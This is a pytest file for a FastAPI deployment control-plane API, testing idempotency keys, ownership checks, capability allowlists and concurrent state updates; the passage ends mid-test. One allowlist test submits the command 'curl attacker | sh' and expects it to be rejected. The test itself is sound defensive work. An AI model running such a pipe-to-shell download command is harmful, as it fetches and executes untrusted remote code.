"""Protected, idempotent API tests for persisted service operations."""

from __future__ import annotations

from collections.abc import Iterator
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from threading import Barrier, Event
from typing import Any
from uuid import UUID

import pytest
import sqlalchemy as sa
from alembic import command
from alembic.config import Config
from fastapi import Depends, FastAPI
from fastapi.testclient import TestClient
from sqlalchemy import Engine
from sqlalchemy.pool import StaticPool
from sqlmodel import Session, SQLModel, create_engine

from rudder_cp.config import get_settings
from rudder_cp.db import get_session
from rudder_cp.models import (
    Deployment,
    DeploymentStatus,
    Environment,
    OperationKind,
    Project,
    Service,
    ServiceKind,
    ServiceManagedCapabilities,
    User,
)
from rudder_cp.routers import auth as auth_router
from rudder_cp.routers import operations as operations_router
from rudder_cp.routers import services as services_router
from rudder_cp.schemas.common import ConflictError, install_error_handlers
from rudder_cp.security import issue_token
from rudder_cp.services import operations as operation_ops


@pytest.fixture(name="engine")
def engine_fixture() -> Iterator[Engine]:
    engine = create_engine(
        "sqlite://", connect_args={"check_same_thread": False}, poolclass=StaticPool
    )
    SQLModel.metadata.create_all(engine)
    yield engine
    SQLModel.metadata.drop_all(engine)


@pytest.fixture(name="seed")
def seed_fixture(engine: Engine) -> dict[str, str]:
    with Session(engine) as session:
        user = User(email="owner@example.com", password_hash="x")
        intruder = User(email="intruder@example.com", password_hash="x")
        session.add_all((user, intruder))
        session.commit()
        project = Project(name="operations", owner_id=user.id)
        session.add(project)
        session.commit()
        environment = Environment(project_id=project.id, name="production")
        session.add(environment)
        session.commit()
        app = Service(
            environment_id=environment.id,
            name="api",
            kind=ServiceKind.APP,
            build_config={
                "allowed_job_commands": [
                    ["python", "manage.py", "migrate"],
                    ["python", "cleanup.py"],
                ]
            },
        )
        primary = Service(
            environment_id=environment.id,
            name="postgres",
            kind=ServiceKind.DATABASE,
            build_config={"data_role": "primary", "managed_image": "postgres:16-alpine"},
        )
        replica = Service(
            environment_id=environment.id,
            name="postgres-replica",
            kind=ServiceKind.DATABASE,
            build_config={
                "data_role": "read_replica",
                "managed_image": "postgres:16-alpine",
            },
        )
        session.add_all((app, primary, replica))
        session.commit()
        session.add_all(
            (
                ServiceManagedCapabilities(
                    service_id=app.id,
                    allowed_job_commands=[
                        ["python", "manage.py", "migrate"],
                        ["python", "cleanup.py"],
                    ],
                    source="test",
                ),
                ServiceManagedCapabilities(
                    service_id=primary.id,
                    database_engine="postgres",
                    data_role="primary",
                    source="test",
                ),
                ServiceManagedCapabilities(
                    service_id=replica.id,
                    database_engine="postgres",
                    data_role="read_replica",
                    source="test",
                ),
            )
        )
        session.commit()
        return {
            "token": issue_token(user.id).token,
            "intruder_token": issue_token(intruder.id).token,
            "app": str(app.id),
            "primary": str(primary.id),
            "replica": str(replica.id),
        }


@pytest.fixture(name="client")
def client_fixture(engine: Engine, monkeypatch: pytest.MonkeyPatch) -> Iterator[TestClient]:
    monkeypatch.setenv("RUDDER_JWT_SECRET", "operations-api-test-secret")
    get_settings.cache_clear()

    app = FastAPI()
    install_error_handlers(app)
    app.include_router(
        operations_router.router,
        dependencies=[Depends(auth_router.get_current_user)],
    )
    app.include_router(services_router.router)

    def session_override() -> Iterator[Session]:
        with Session(engine) as session:
            yield session

    app.dependency_overrides[get_session] = session_override
    try:
        with TestClient(app) as test_client:
            yield test_client
    finally:
        get_settings.cache_clear()


def headers(seed: dict[str, str], key: str = "request-1") -> dict[str, str]:
    return {
        "Authorization": f"Bearer {seed['token']}",
        "Idempotency-Key": key,
    }


def create_scale(
    client: TestClient,
    seed: dict[str, str],
    *,
    service: str | None = None,
    replicas: int = 2,
    key: str = "request-1",
    **extra: Any,
) -> dict[str, Any]:
    response = client.post(
        f"/services/{service or seed['app']}/operations/scale",
        headers=headers(seed, key),
        json={"replicas": replicas, **extra},
    )
    assert response.status_code == 202, response.text
    return response.json()


def test_operations_are_protected_and_require_idempotency_key(
    client: TestClient, seed: dict[str, str]
) -> None:
    assert client.get(f"/services/{seed['app']}/operations").status_code == 401

    response = client.post(
        f"/services/{seed['app']}/operations/scale",
        headers={"Authorization": f"Bearer {seed['token']}"},
        json={"replicas": 2},
    )
    assert response.status_code == 422


def test_scale_is_idempotent_and_ignores_client_service_identity(
    client: TestClient, seed: dict[str, str]
) -> None:
    first = create_scale(
        client,
        seed,
        service=seed["replica"],
        service_kind="app",
        data_role="primary",
    )
    second = create_scale(
        client,
        seed,
        service=seed["replica"],
        service_kind="database",
        data_role="read_replica",
    )

    assert first["id"] == second["id"]
    assert first["kind"] == "scale"
    assert first["status"] == "pending"
    assert first["requested"] == {"replicas": 2}
    assert "service_kind" not in first["requested"]
    assert "data_role" not in first["requested"]


def test_primary_database_scale_cannot_be_spoofed_by_client_hints(
    client: TestClient, seed: dict[str, str]
) -> None:
    response = client.post(
        f"/services/{seed['primary']}/operations/scale",
        headers=headers(seed),
        json={"replicas": 2, "service_kind": "app", "data_role": "read_replica"},
    )
    assert response.status_code == 422
    assert "database primaries" in response.json()["message"]


def test_same_idempotency_key_with_different_payload_does_not_collide(
    client: TestClient, seed: dict[str, str]
) -> None:
    create_scale(client, seed, replicas=2, key="same-client-key")
    second = client.post(
        f"/services/{seed['app']}/operations/scale",
        headers=headers(seed, "same-client-key"),
        json={"replicas": 3},
    )

    assert second.status_code == 409
    assert second.json()["code"] == "conflict"


def test_idempotency_key_cannot_be_reused_for_another_operation_kind(
    client: TestClient, seed: dict[str, str]
) -> None:
    key = "cross-kind-idempotency-key"
    autoscaling = client.post(
        f"/services/{seed['app']}/operations/autoscaling",
        headers=headers(seed, key),
        json={"min_replicas": 2, "max_replicas": 4},
    )
    assert autoscaling.status_code == 202, autoscaling.text
    assert autoscaling.json()["kind"] == "autoscaling"

    scale = client.post(
        f"/services/{seed['app']}/operations/scale",
        headers=headers(seed, key),
        json={"replicas": 3},
    )
    assert scale.status_code == 409, scale.text
    assert scale.json()["code"] == "conflict"


def test_operations_hide_other_users_services(
    client: TestClient, seed: dict[str, str]
) -> None:
    response = client.get(
        f"/services/{seed['app']}/operations",
        headers={"Authorization": f"Bearer {seed['intruder_token']}"},
    )
    assert response.status_code == 404
    assert response.json()["code"] == "not_found"


def test_patch_operations_persists_declared_desired_intent(
    client: TestClient, seed: dict[str, str]
) -> None:
    state = client.get(
        f"/services/{seed['app']}/operations?format=envelope",
        headers={"Authorization": f"Bearer {seed['token']}"},
    )
    assert state.status_code == 200, state.text
    response = client.patch(
        f"/services/{seed['app']}/operations",
        headers={
            "Authorization": f"Bearer {seed['token']}",
            "If-Match": state.headers["etag"],
        },
        json={"autoscaling": {"min_replicas": 2, "max_replicas": 4}},
    )
    assert response.status_code == 200, response.text
    assert response.json()["desired"]["autoscaling"] == {
        "min_replicas": 2,
        "max_replicas": 4,
        "target_cpu_percent": 80,
        "target_memory_percent": None,
    }


def test_canonical_operation_families_create_typed_records(
    client: TestClient, seed: dict[str, str]
) -> None:
    cases = (
        ("app", "/operations/rollout", {"strategy": "blue_green"}),
        ("app", "/operations/placement", {"topology_spread": True}),
        ("primary", "/operations/data/backups", {"retention_days": 14}),
        (
            "primary",
            "/operations/data/restore",
            {"backup_id": "00000000-0000-0000-0000-000000000002", "acknowledge_data_loss": True},
        ),
        ("primary", "/operations/data/read-replicas", {"replicas": 1}),
        (
            "primary",
            "/operations/data/storage",
            {"current_size_mb": 1024, "requested_size_mb": 2048},
        ),
        ("app", "/operations/jobs/run", {"command": ["python", "manage.py", "migrate"]}),
        ("app", "/operations/observability", {"prometheus": True, "grafana": True}),
    )
    for index, (service, path, payload) in enumerate(cases):
        response = client.post(
            f"/services/{seed[service]}{path}",
            headers=headers(seed, f"canonical-{index}"),
            json=payload,
        )
        assert response.status_code == 202, response.text


def test_schedule_can_be_created_and_deleted(
    client: TestClient, seed: dict[str, str]
) -> None:
    created = client.post(
        f"/services/{seed['app']}/operations/schedules",
        headers=headers(seed, "schedule-create"),
        json={"cron": "0 * * * *", "command": ["python", "cleanup.py"]},
    )
    assert created.status_code == 202, created.text

    deleted = client.delete(
        f"/services/{seed['app']}/operations/schedules/{created.json()['id']}",
        headers={"Authorization": f"Bearer {seed['token']}"},
    )
    assert deleted.status_code == 204, deleted.text

    state = client.get(
        f"/services/{seed['app']}/operations?format=envelope",
        headers={"Authorization": f"Bearer {seed['token']}"},
    )
    assert state.status_code == 200
    cancelled = next(item for item in state.json()["history"] if item["id"] == created.json()["id"])
    assert cancelled["status"] == "cancelled"
    assert cancelled["observed"]["cancelled"] is True


def test_identical_schedules_keep_operation_identity_when_one_is_cancelled(
    client: TestClient, seed: dict[str, str]
) -> None:
    payload = {"cron": "0 * * * *", "command": ["python", "cleanup.py"]}
    first = client.post(
        f"/services/{seed['app']}/operations/schedules",
        headers=headers(seed, "schedule-identity-first"),
        json=payload,
    )
    second = client.post(
        f"/services/{seed['app']}/operations/schedules",
        headers=headers(seed, "schedule-identity-second"),
        json=payload,
    )
    assert first.status_code == 202, first.text
    assert second.status_code == 202, second.text

    before_cancel = client.get(
        f"/services/{seed['app']}/operations?format=envelope",
        headers={"Authorization": f"Bearer {seed['token']}"},
    )
    assert before_cancel.status_code == 200, before_cancel.text
    schedules = before_cancel.json()["desired"]["schedules"]
    assert {entry["operation_id"] for entry in schedules} == {
        first.json()["id"],
        second.json()["id"],
    }
    assert all(entry["spec"] == first.json()["requested"] for entry in schedules)

    cancelled = client.delete(
        f"/services/{seed['app']}/operations/schedules/{first.json()['id']}",
        headers={"Authorization": f"Bearer {seed['token']}"},
    )
    assert cancelled.status_code == 204, cancelled.text

    after_cancel = client.get(
        f"/services/{seed['app']}/operations?format=envelope",
        headers={"Authorization": f"Bearer {seed['token']}"},
    )
    assert after_cancel.status_code == 200, after_cancel.text
    assert after_cancel.json()["desired"]["schedules"] == [
        {"operation_id": second.json()["id"], "spec": second.json()["requested"]}
    ]


def test_schedule_rejects_database_services(
    client: TestClient, seed: dict[str, str]
) -> None:
    response = client.post(
        f"/services/{seed['primary']}/operations/schedules",
        headers=headers(seed, "database-schedule"),
        json={"cron": "0 * * * *", "command": ["python", "cleanup.py"]},
    )
    assert response.status_code == 422, response.text
    assert response.json()["code"] == "invalid_request"


def test_operations_are_registered_on_the_real_application() -> None:
    from rudder_cp.main import create_app

    app = create_app()
    response = TestClient(app).get("/services/00000000-0000-0000-0000-000000000000/operations")
    assert response.status_code == 401


def test_operations_state_migration_preserves_audit_constraints(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    database_url = f"sqlite:///{tmp_path / 'operations-idempotency.db'}"
    monkeypatch.setenv("RUDDER_DATABASE_URL", database_url)
    get_settings.cache_clear()
    control_plane = Path(__file__).parents[1]
    config = Config(str(control_plane / "alembic.ini"))
    config.set_main_option("script_location", str(control_plane / "migrations"))
    try:
        # ``c1d24...`` only adds a PostgreSQL enum member; SQLite has no
        # equivalent ALTER TYPE. Stamp its otherwise identical SQLite schema
        # so this test can exercise the later operations migrations.
        command.upgrade(config, "b9a11d39f9d1")
        command.stamp(config, "c1d24ef9a8b7")
        command.upgrade(config, "0008")
        command.upgrade(config, "0010")
        engine = sa.create_engine(database_url)
        with engine.connect() as connection:
            constraints = sa.inspect(connection).get_unique_constraints("service_operation")
            state_constraints = sa.inspect(connection).get_unique_constraints(
                "service_operations_state"
            )
        assert any(
            constraint["name"] == "uq_service_operation_service_idempotency_key"
            for constraint in constraints
        )
        assert any(
            constraint["name"] == "uq_service_operations_state_service"
            for constraint in state_constraints
        )
        engine.dispose()
    finally:
        get_settings.cache_clear()


def test_list_is_newest_first_and_data_operations_are_type_checked(
    client: TestClient, seed: dict[str, str]
) -> None:
    scale = create_scale(client, seed, key="scale-history")
    backup = client.post(
        f"/services/{seed['app']}/operations/backups",
        headers=headers(seed, "backup-history"),
        json={"retention_days": 14},
    )
    assert backup.status_code == 422

    resource = client.post(
        f"/services/{seed['app']}/operations/resources",
        headers=headers(seed, "resource-history"),
        json={"cpu_request": "250m", "memory_limit_mb": 512},
    )
    assert resource.status_code == 202, resource.text

    listed = client.get(
        f"/services/{seed['app']}/operations?format=envelope",
        headers={"Authorization": f"Bearer {seed['token']}"},
    )
    assert listed.status_code == 200
    assert [operation["id"] for operation in listed.json()["history"]] == [
        resource.json()["id"],
        scale["id"],
    ]


def test_operations_return_uniform_not_found_and_validation_errors(
    client: TestClient, seed: dict[str, str]
) -> None:
    missing = client.get(
        "/services/00000000-0000-0000-0000-000000000000/operations",
        headers={"Authorization": f"Bearer {seed['token']}"},
    )
    assert missing.status_code == 404
    assert missing.json()["code"] == "not_found"

    invalid = client.post(
        f"/services/{seed['app']}/operations/autoscaling",
        headers=headers(seed, "invalid-autoscale"),
        json={"min_replicas": 5, "max_replicas": 2},
    )
    assert invalid.status_code == 422
    assert invalid.json()["code"] in {"validation_error", "invalid_request"}


def test_operations_get_preserves_history_list_and_envelope_is_explicit(
    client: TestClient, seed: dict[str, str]
) -> None:
    created = create_scale(client, seed, replicas=3, key="desired-scale")
    history = client.get(
        f"/services/{seed['app']}/operations",
        headers={"Authorization": f"Bearer {seed['token']}"},
    )
    assert history.status_code == 200, history.text
    assert history.json()[0]["id"] == created["id"]

    envelope = client.get(
        f"/services/{seed['app']}/operations?format=envelope",
        headers={"Authorization": f"Bearer {seed['token']}"},
    )
    assert envelope.status_code == 200, envelope.text
    assert envelope.json()["desired"]["replicas"] == 3
    assert envelope.json()["observed"]["reconciliation"]["pending"] is True
    assert envelope.json()["history"][0]["id"] == created["id"]
    assert envelope.headers["etag"] == '"1"'

    explicit_list = client.get(
        f"/services/{seed['app']}/operations?format=list",
        headers={"Authorization": f"Bearer {seed['token']}"},
    )
    assert explicit_list.status_code == 200
    assert explicit_list.json()[0]["id"] == created["id"]


def test_operations_envelope_exposes_only_safe_server_managed_capabilities(
    client: TestClient, seed: dict[str, str]
) -> None:
    """The dashboard may gate controls, but never receives mutable build input."""
    app_response = client.get(
        f"/services/{seed['app']}/operations?format=envelope",
        headers=headers(seed),
    )
    database_response = client.get(
        f"/services/{seed['primary']}/operations?format=envelope",
        headers=headers(seed),
    )

    assert app_response.status_code == 200, app_response.text
    assert database_response.status_code == 200, database_response.text
    assert app_response.json()["capabilities"] == {
        "database_engine": None,
        "data_role": None,
        "job_commands_available": True,
        "storage_expansion_available": False,
        "backup_restore_available": False,
        "read_replicas_available": False,
    }
    assert database_response.json()["capabilities"] == {
        "database_engine": "postgres",
        "data_role": "primary",
        "job_commands_available": False,
        # A managed database is not enough. These actions stay hidden until
        # the active runtime has a real operator/backend for them.
        "storage_expansion_available": False,
        "backup_restore_available": False,
        "read_replicas_available": False,
    }
    assert "allowed_job_commands" not in app_response.json()["capabilities"]


def test_patch_deep_merges_nested_intent_and_rejects_stale_version(
    client: TestClient, seed: dict[str, str]
) -> None:
    initial = client.get(
        f"/services/{seed['app']}/operations?format=envelope",
        headers={"Authorization": f"Bearer {seed['token']}"},
    )
    assert initial.headers["etag"] == '"0"'

    first = client.patch(
        f"/services/{seed['app']}/operations",
        headers={"Authorization": f"Bearer {seed['token']}", "If-Match": '"0"'},
        json={"resources": {"cpu_request": "250m", "cpu_limit": "500m"}},
    )
    assert first.status_code == 200, first.text
    assert first.json()["version"] == 1

    second = client.patch(
        f"/services/{seed['app']}/operations",
        headers={"Authorization": f"Bearer {seed['token']}", "If-Match": '"1"'},
        json={"resources": {"memory_request_mb": 256}},
    )
    assert second.status_code == 200, second.text
    assert second.json()["desired"]["resources"] == {
        "cpu_request": "250m",
        "cpu_limit": "500m",
        "memory_request_mb": 256,
        "memory_limit_mb": None,
    }

    stale = client.patch(
        f"/services/{seed['app']}/operations",
        headers={"Authorization": f"Bearer {seed['token']}", "If-Match": '"1"'},
        json={"placement": {"topology_spread": True}},
    )
    assert stale.status_code == 409
    assert stale.json()["code"] == "conflict"


def test_operations_compare_and_swap_allows_only_one_stale_session_to_win(
    tmp_path: Path,
) -> None:
    """Two independently opened sessions cannot both write version zero.

    This intentionally avoids the TestClient's request lifecycle: the second
    session keeps its initial state object alive while the first transaction
    commits. A read-then-write implementation would accept both writes; the
    persistence update must compare the version in SQL instead.
    """
    engine = create_engine(f"sqlite:///{tmp_path / 'operations-race.db'}")
    SQLModel.metadata.create_all(engine)
    try:
        with Session(engine) as setup:
            owner = User(email="race-owner@example.com", password_hash="x")
            setup.add(owner)
            setup.commit()
            project = Project(name="race", owner_id=owner.id)
            setup.add(project)
            setup.commit()
            environment = Environment(project_id=project.id, name="production")
            service = Service(environment_id=environment.id, name="api", kind=ServiceKind.APP)
            setup.add_all((environment, service))
            setup.commit()
            service_id, owner_id = service.id, owner.id

        with Session(engine) as first, Session(engine) as second:
            first_snapshot = operation_ops.get_operations_state(
                first, service_id, owner_id=owner_id
            )
            second_snapshot = operation_ops.get_operations_state(
                second, service_id, owner_id=owner_id
            )
            assert first_snapshot.version == second_snapshot.version == 0

            winner = operation_ops.update_operations_intent(
                first,
                service_id=service_id,
                owner_id=owner_id,
                changes={"resources": {"cpu_request": "250m"}},
                expected_version=first_snapshot.version,
            )
            assert winner.version == 1

            with pytest.raises(ConflictError):
                operation_ops.update_operations_intent(
                    second,
                    service_id=service_id,
                    owner_id=owner_id,
                    changes={"placement": {"topology_spread": True}},
                    expected_version=second_snapshot.version,
                )

        with Session(engine) as verify:
            state = operation_ops.get_operations_state(verify, service_id, owner_id=owner_id)
            assert state.version == 1
            assert state.desired["resources"]["cpu_request"] == "250m"
            assert state.desired["placement"] is None
            operations = operation_ops.list_operations(verify, service_id, owner_id=owner_id)
            assert len(operations) == 1
            assert operations[0].requested["patch"] == {
                "resources": {"cpu_request": "250m"}
            }
    finally:
        engine.dispose()


def test_rollback_requires_an_eligible_deployment_of_the_same_service(
    client: TestClient, seed: dict[str, str], engine: Engine
) -> None:
    app_id = UUID(seed["app"])
    with Session(engine) as session:
        valid = Deployment(
            service_id=app_id,
            status=DeploymentStatus.SUPERSEDED,
            image_tag="registry.local/immutable:prior",
        )
        queued = Deployment(service_id=app_id, status=DeploymentStatus.QUEUED)
        foreign = Deployment(service_id=UUID(seed["primary"]), status=DeploymentStatus.LIVE)
        session.add_all((valid, queued, foreign))
        session.commit()
        valid_id, queued_id, foreign_id = str(valid.id), str(queued.id), str(foreign.id)

    accepted = client.post(
        f"/services/{app_id}/operations/rollback",
        headers=headers(seed, "rollback-valid"),
        json={"deployment_id": valid_id},
    )
    assert accepted.status_code == 202, accepted.text
    assert accepted.json()["requested"]["execution"] == "pending_runtime_reconciliation"

    for index, target in enumerate((queued_id, foreign_id, "00000000-0000-0000-0000-000000000099")):
        rejected = client.post(
            f"/services/{app_id}/operations/rollback",
            headers=headers(seed, f"rollback-invalid-{index}"),
            json={"deployment_id": target},
        )
        assert rejected.status_code in {404, 422}, rejected.text


@pytest.mark.parametrize(
    ("path", "payload"),
    (
        ("/operations/autoscaling", {"min_replicas": 1, "max_replicas": 2}),
        ("/operations/placement", {"topology_spread": True}),
        ("/operations/rollout", {"strategy": "blue_green"}),
        ("/operations/jobs/run", {"command": ["echo", "no"]}),
    ),
)
def test_app_only_operations_reject_database_services(
    client: TestClient, seed: dict[str, str], path: str, payload: dict[str, Any]
) -> None:
    response = client.post(
        f"/services/{seed['primary']}{path}",
        headers=headers(seed, f"database-app-gate-{path}"),
        json=payload,
    )
    assert response.status_code == 422, response.text
    assert response.json()["code"] == "invalid_request"


def test_patch_operations_enforces_persisted_service_capabilities(
    client: TestClient, seed: dict[str, str]
) -> None:
    state = client.get(
        f"/services/{seed['primary']}/operations?format=envelope",
        headers={"Authorization": f"Bearer {seed['token']}"},
    )
    assert state.status_code == 200
    headers_with_version = {
        "Authorization": f"Bearer {seed['token']}",
        "If-Match": state.headers["etag"],
    }
    for payload in (
        {"autoscaling": {"min_replicas": 1, "max_replicas": 2}},
        {"replicas": 2},
    ):
        rejected = client.patch(
            f"/services/{seed['primary']}/operations",
            headers=headers_with_version,
            json=payload,
        )
        assert rejected.status_code == 422, rejected.text

    app_state = client.get(
        f"/services/{seed['app']}/operations?format=envelope",
        headers={"Authorization": f"Bearer {seed['token']}"},
    )
    rejected_data = client.patch(
        f"/services/{seed['app']}/operations",
        headers={
            "Authorization": f"Bearer {seed['token']}",
            "If-Match": app_state.headers["etag"],
        },
        json={"read_replicas": {"replicas": 1}},
    )
    assert rejected_data.status_code == 422, rejected_data.text


def test_manual_scale_and_autoscaling_are_mutually_exclusive_on_typed_endpoints(
    client: TestClient, seed: dict[str, str], engine: Engine
) -> None:
    scaled = create_scale(client, seed, key="manual-scale-before-hpa")
    assert scaled["kind"] == "scale"
    hpa_after_scale = client.post(
        f"/services/{seed['app']}/operations/autoscaling",
        headers=headers(seed, "hpa-after-manual-scale"),
        json={"min_replicas": 1, "max_replicas": 3},
    )
    assert hpa_after_scale.status_code == 422, hpa_after_scale.text

    # A separate service demonstrates the opposite direction without manually
    # clearing the desired state under test.
    app_id = UUID(seed["app"])
    with Session(engine) as session:
        environment_id = session.get(Service, app_id).environment_id
        second = Service(environment_id=environment_id, name="worker", kind=ServiceKind.APP)
        session.add(second)
        session.commit()
        second_id = str(second.id)
    hpa = client.post(
        f"/services/{second_id}/operations/autoscaling",
        headers=headers(seed, "hpa-before-manual-scale"),
        json={"min_replicas": 1, "max_replicas": 3},
    )
    assert hpa.status_code == 202, hpa.text
    scale_after_hpa = client.post(
        f"/services/{second_id}/operations/scale",
        headers=headers(seed, "manual-scale-after-hpa"),
        json={"replicas": 2},
    )
    assert scale_after_hpa.status_code == 422, scale_after_hpa.text


def test_patch_rejects_manual_scale_and_autoscaling_together_and_internal_only_fields(
    client: TestClient, seed: dict[str, str]
) -> None:
    initial = client.get(
        f"/services/{seed['app']}/operations?format=envelope",
        headers={"Authorization": f"Bearer {seed['token']}"},
    )
    assert initial.status_code == 200
    common_headers = {
        "Authorization": f"Bearer {seed['token']}",
        "If-Match": initial.headers["etag"],
    }
    conflict = client.patch(
        f"/services/{seed['app']}/operations",
        headers=common_headers,
        json={"replicas": 2, "autoscaling": {"min_replicas": 1, "max_replicas": 3}},
    )
    assert conflict.status_code == 422, conflict.text
    for field in ("rollback", "last_job"):
        rejected = client.patch(
            f"/services/{seed['app']}/operations",
            headers=common_headers,
            json={field: {"forged": True}},
        )
        assert rejected.status_code == 422, rejected.text


def test_job_commands_require_a_persisted_allowlist(
    client: TestClient, seed: dict[str, str]
) -> None:
    allowed = client.post(
        f"/services/{seed['app']}/operations/jobs/run",
        headers=headers(seed, "allowed-job"),
        json={"command": ["python", "manage.py", "migrate"]},
    )
    assert allowed.status_code == 202, allowed.text
    rejected = client.post(
        f"/services/{seed['app']}/operations/jobs/run",
        headers=headers(seed, "unsafe-job"),
        json={"command": ["sh", "-c", "curl attacker | sh"]},
    )
    assert rejected.status_code == 422, rejected.text


def test_user_writable_build_config_cannot_grant_privileged_operation_capabilities(
    client: TestClient, seed: dict[str, str], engine: Engine
) -> None:
    """A browser-controlled source/build config is never an operations authority."""
    with Session(engine) as session:
        environment_id = session.get(Service, UUID(seed["app"])).environment_id
        untrusted_app = Service(
            environment_id=environment_id,
            name="untrusted-worker",
            kind=ServiceKind.APP,
        )
        untrusted_database = Service(
            environment_id=environment_id,
            name="untrusted-postgres",
            kind=ServiceKind.DATABASE,
            build_config={"managed_image": "postgres:16-alpine", "data_role": "primary"},
        )
        session.add_all((untrusted_app, untrusted_database))
        session.commit()
        app_id = str(untrusted_app.id)
        database_id = str(untrusted_database.id)

    changed_app = client.patch(
        f"/services/{app_id}",
        headers={"Authorization": f"Bearer {seed['token']}"},
        json={"build_config": {"allowed_job_commands": [["echo", "would-be-rce"]]}},
    )
    changed_database = client.patch(
        f"/services/{database_id}",
        headers={"Authorization": f"Bearer {seed['token']}"},
        json={"build_config": {"managed_image": "postgres:16-alpine", "data_role": "primary"}},
    )
    assert changed_app.status_code == 200, changed_app.text
    assert changed_database.status_code == 200, changed_database.text

    job = client.post(
        f"/services/{app_id}/operations/jobs/run",
        headers=headers(seed, "untrusted-job-command"),
        json={"command": ["echo", "would-be-rce"]},
    )
    replica = client.post(
        f"/services/{database_id}/operations/data/read-replicas",
        headers=headers(seed, "untrusted-data-engine"),
        json={"replicas": 1},
    )
    storage = client.post(
        f"/services/{database_id}/operations/data/storage",
        headers=headers(seed, "untrusted-data-storage"),
        json={"current_size_mb": 1024, "requested_size_mb": 2048},
    )

    assert job.status_code == 422, job.text
    assert replica.status_code == 422, replica.text
    assert storage.status_code == 422, storage.text


@pytest.mark.parametrize(
    ("image", "expected_status"),
    (
        ("postgres:16-alpine", 202),
        ("redis:7-alpine", 422),
        ("mongo:7", 422),
        ("custom:latest", 422),
    ),
)
def test_sql_data_operations_use_persisted_engine_metadata(
    client: TestClient, seed: dict[str, str], engine: Engine, image: str, expected_status: int
) -> None:
    with Session(engine) as session:
        environment_id = session.get(Service, UUID(seed["app"])).environment_id
        engine_name = image.split(":", 1)[0]
        data_service = Service(
            environment_id=environment_id,
            name=f"engine-{engine_name}",
            kind=ServiceKind.DATABASE,
            build_config={"managed_image": "untrusted-browser-value"},
        )
        session.add(data_service)
        session.flush()
        session.add(
            ServiceManagedCapabilities(
                service_id=data_service.id,
                database_engine=engine_name,
                data_role="primary",
                source="test",
            )
        )
        session.commit()
        service_id = str(data_service.id)
    response = client.post(
        f"/services/{service_id}/operations/data/read-replicas",
        headers=headers(seed, f"engine-{image}"),
        json={"replicas": 1},
    )
    assert response.status_code == expected_status, response.text


def test_rollback_rejects_database_services_even_with_a_valid_artifact(
    client: TestClient, seed: dict[str, str], engine: Engine
) -> None:
    primary_id = UUID(seed["primary"])
    with Session(engine) as session:
        deployment = Deployment(
            service_id=primary_id,
            status=DeploymentStatus.SUPERSEDED,
            image_tag="registry.local/postgres:immutable",
        )
        session.add(deployment)
        session.commit()
        deployment_id = str(deployment.id)
    response = client.post(
        f"/services/{primary_id}/operations/rollback",
        headers=headers(seed, "database-rollback"),
        json={"deployment_id": deployment_id},
    )
    assert response.status_code == 422, response.text


def test_concurrent_distinct_operations_retain_both_desired_fields_and_audits(
    tmp_path: Path,
) -> None:
    engine = create_engine(
        f"sqlite:///{tmp_path / 'concurrent-operations.db'}",
        connect_args={"check_same_thread": False, "timeout": 15},
    )
    SQLModel.metadata.create_all(engine)
    try:
        with Session(engine) as session:
            owner = User(email="concurrent-owner@example.com", password_hash="x")
            session.add(owner)
            session.commit()
            project = Project(name="concurrent", owner_id=owner.id)
            session.add(project)
            session.commit()
            environment = Environment(project_id=project.id, name="production")
            session.add(environment)
            session.commit()
            service = Service(environment_id=environment.id, name="api", kind=ServiceKind.APP)
            session.add(service)
            session.commit()
            service_id, owner_id = service.id, owner.id

        barrier = Barrier(2)

        def submit(kind: OperationKind, requested: dict[str, Any], key: str) -> str:
            with Session(engine) as session:
                barrier.wait(timeout=10)
                return str(
                    operation_ops.create_operation(
                        session,
                        service_id=service_id,
                        kind=kind,
                        requested=requested,
                        idempotency_key=key,
                        owner_id=owner_id,
                    ).id
                )

        with ThreadPoolExecutor(max_workers=2) as executor:
            results = list(
                executor.map(
                    lambda args: submit(*args),
                    (
                        (OperationKind.SCALE, {"replicas": 2}, "concurrent-scale"),
                        (
                            OperationKind.RESOURCES,
                            {"cpu_request": "250m", "memory_limit_mb": 512},
                            "concurrent-resources",
                        ),
                    ),
                )
            )
        assert len(set(results)) == 2
        with Session(engine) as session:
            state = operation_ops.get_operations_state(session, service_id, owner_id=owner_id)
            history = operation_ops.list_operations(session, service_id, owner_id=owner_id)
        assert state.desired["replicas"] == 2
        assert state.desired["resources"]["cpu_request"] == "250m"
        assert {operation.kind for operation in history} == {
            OperationKind.SCALE,
            OperationKind.RESOURCES,
        }
    finally:
        engine.dispose()


def test_concurrent_schedule_cancel_and_resource_update_preserve_both_intents(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Cancelling a schedule must not overwrite a simultaneous desired-state write."""
    engine = create_engine(
        f"sqlite:///{tmp_path / 'schedule-cancel-race.db'}",
        connect_args={"check_same_thread": False, "timeout": 15},
    )
    SQLModel.metadata.create_all(engine)
    try:
        with Session(engine) as session:
            owner = User(email="schedule-owner@example.com", password_hash="x")
            session.add(owner)
            session.commit()
            project = Project(name="schedules", owner_id=owner.id)
            session.add(project)
            session.commit()
            environment = Environment(project_id=project.id, name="production")
            session.add(environment)
            session.commit()
            service = Service(environment_id=environment.id, name="worker", kind=ServiceKind.APP)
            session.add(service)
            session.commit()
            session.add(
                ServiceManagedCapabilities(
                    service_id=service.id,
                    allowed_job_commands=[["python", "cleanup.py"]],
                    source="test",
                )
            )
            session.commit()
            schedule = operation_ops.create_operation(
                session,
                service_id=service.id,
                kind=OperationKind.SCHEDULE,
                requested={
                    "command": ["python", "cleanup.py"],
                    "cron": "0 * * * *",
                    "timeout_seconds": 900,
                    "retries": 1,
                    "concurrency_policy": "forbid",
                },
                idempotency_key="scheduled-cleanup",
                owner_id=owner.id,
            )
            service_id, owner_id, schedule_id = service.id, owner.id, schedule.id

        stale_state_loaded = Event()
        allow_cancel = Event()
        original_state_for = operation_ops._state_for

        def delayed_state_for(session: Session, service: Service):
            state = original_state_for(session, service)
            if session.info.get("schedule_cancel"):
                stale_state_loaded.set()
                assert allow_cancel.wait(timeout=10)
            return state

        monkeypatch.setattr(operation_ops, "_state_for", delayed_state_for)

        def cancel() -> None:
            with Session(engine) as session:
                session.info["schedule_cancel"] = True
                operation_ops.delete_schedule(
                    session,
                    service_id=service_id,
                    operation_id=schedule_id,
                    owner_id=owner_id,
                )

        def configure_resources() -> None:
            assert stale_state_loaded.wait(timeout=10)
            with Session(engine) as session:
                operation_ops.create_operation(
                    session,
                    service_id=service_id,
                    kind=OperationKind.RESOURCES,
